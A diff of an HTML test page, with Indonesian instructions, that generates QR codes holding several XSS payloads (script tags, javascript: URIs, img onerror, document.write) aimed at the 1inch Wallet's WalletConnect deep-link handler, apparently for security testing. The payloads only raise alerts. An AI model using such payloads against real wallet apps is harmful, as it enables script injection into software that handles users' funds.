@@ -3,34 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Test - WalletConnect</title>
+    <title>Universal XSS Test - 1inch WalletConnect</title>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <style>
         body { font-family: Arial; background:#000; color:#0f0; padding:20px; text-align:center; }
+        .payload { word-break: break-all; background:#1a1a2e; padding:10px; border-radius:8px; margin:15px 0; }
     </style>
 </head>
 <body>
-    <h1>XSS / Injection Test for WalletConnect</h1>
+    <h1>Universal XSS Test for 1inch WalletConnect</h1>
 
     <div id="qrcode"></div>
-    <p><strong>Scan QR ini di WalletConnect</strong></p>
+
+    <div class="payload">
+        Payload: <br>
+        <code>1inch://connect?uri=javascript:alert('Universal XSS in 1inch Wallet')</code>
+    </div>
 
     <script>
-        const payload = `1inch://connect?data=<img src=x onerror=alert('XSS in 1inch WalletConnect')>`;
+        // Multiple XSS payloads in QR
+        const xssPayloads = [
+            "1inch://connect?data=<script>alert('XSS 1inch WalletConnect')</script>",
+            "1inch://connect?uri=javascript:alert('Universal XSS Test')",
+            "1inch://bypass-test?<img src=x onerror=alert('XSS')>",
+            "1inch://connect?payload=javascript:document.write('<h1>XSS Success</h1>')",
+        ];
 
-        new QRCode(document.getElementById("qrcode"), {
-            text: payload,
-            width: 300,
-            height: 300,
-            colorDark : "#ffffff",
-            colorLight : "#000000"
+        xssPayloads.forEach((payload, i) => {
+            const div = document.createElement('div');
+            div.innerHTML = `<h3>Payload ${i+1}</h3>`;
+            const qr = document.createElement('div');
+            qr.id = 'qr' + i;
+            div.appendChild(qr);
+            document.body.appendChild(div);
+
+            new QRCode(qr, {
+                text: payload,
+                width: 280,
+                height: 280,
+                colorDark : "#ff0000",
+                colorLight : "#000000"
+            });
         });
 
-        // Test reflected XSS di halaman ini
-        console.log("%cXSS Test Payload Ready", "color:red; font-size:18px");
+        console.log("%cUniversal XSS Test Loaded - Scan QR Codes", "color:red; font-size:16px");
     </script>
 
-    <p>Coba scan QR Code di atas menggunakan 1inch Wallet atau aplikasi WalletConnect lain.</p>
-    <p>Perhatikan apakah ada alert atau eksekusi script.</p>
+    <p><strong>Cara Test:</strong></p>
+    <p>1. Scan QR Code di atas menggunakan kamera 1inch Wallet atau WalletConnect</p>
+    <p>2. Perhatikan apakah muncul alert atau eksekusi script</p>
+    <p>3. Coba juga klik link di bawah jika ada</p>
 </body>
 </html>
